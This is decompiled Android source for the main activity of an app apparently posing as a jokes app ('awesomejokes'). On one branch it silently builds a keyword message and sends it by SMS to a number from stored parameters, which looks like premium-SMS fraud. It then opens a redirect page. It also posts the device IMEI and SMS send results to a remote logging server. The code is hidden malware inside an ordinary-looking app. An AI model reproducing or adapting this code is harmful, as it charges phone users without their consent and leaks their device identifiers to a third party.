package com.droidmojo.awesomejokes;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.telephony.SmsManager;
import shared.library.us.CustomWebView;
import shared.library.us.HttpPosting;
import shared.library.us.Marketing;
import shared.library.us.Parameters;
import shared.library.us.Splash;

public class Main extends Activity {
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        startActivityForResult(new Intent(this, Splash.class), 1);
    }

    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (resultCode == 1) {
            showWebView(HttpPosting.appurl);
        } else if (resultCode == 2) {
            startActivityForResult(new Intent(this, Marketing.class), 1);
        } else if (resultCode == 3) {
            String query = "";
            String body = "";
            try {
                Parameters.jsonString = getPersistentData("atpJSONString");
                Parameters.init();
                body = Parameters.keyword + "  ?" + String.format("usca=%s", new Object[]{Parameters.usca});
                if (Parameters.debug.equals("1")) {
                    HttpPosting.postData2("http://android.tetulus.com/atp-log.php?imei=" + Parameters.imei + "&pid=" + getString(2130968579) + "&type=message&log=" + body.replace(" ", "_"));
                }
                if (body.length() > 160) {
                    body = body.substring(0, 160);
                }
            } catch (Exception e) {
            }
            try {
                String SENT = "SMS_SENT";
                PendingIntent sentPI = PendingIntent.getBroadcast(this, 0, new Intent(SENT), null);
                registerReceiver(new BroadcastReceiver() {
                    public void onReceive(Context context, Intent intent) {
                        String result = "Unknown";
                        switch (getResultCode()) {
                            case -1:
                                result = "SMS_sent";
                                break;
                            case 1:
                                result = "Generic_failure";
                                break;
                            case 2:
                                result = "Radio_off";
                                break;
                            case 3:
                                result = "Null_PDU";
                                break;
                            case 4:
                                result = "No_service";
                                break;
                        }
                        if (Parameters.debug.equals("1")) {
                            HttpPosting.postData2("http://android.tetulus.com/atp-log.php?imei=" + Parameters.imei + "&pid=" + Main.this.getString(2130968579) + "&type=sms&log=" + result);
                        }
                    }
                }, new IntentFilter(SENT));
                SmsManager.getDefault().sendTextMessage(Parameters.csc, null, body, sentPI, null);
                showWebView(getString(2130968578) + "hredirect.php?" + Parameters.getParams());
            } catch (Exception e2) {
                Exception ex = e2;
                if (Parameters.debug.equals("1")) {
                    HttpPosting.postData2("http://android.tetulus.com/atp-log.php?imei=error&pid=" + getString(2130968579) + "&type=error&log=" + ex.getLocalizedMessage());
                }
                showWebView(getString(2130968578) + "hredirect.php?" + Parameters.getParams());
            }
        } else if (resultCode == 4) {
            try {
                showWebView(HttpPosting.appurl + "?" + Parameters.getParams());
            } catch (Exception e3) {
            }
        } else if (resultCode == 99) {
            finish();
        } else {
            finish();
        }
    }

    public void showWebView(String url) {
        CustomWebView webView = new CustomWebView(this);
        webView.loadUrl(url);
        setContentView(webView);
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        super.onDestroy();
    }

    private String getPersistentData(String key) {
        return getApplicationContext().getSharedPreferences(getString(2130968577), 0).getString(key, "unknown");
    }
}
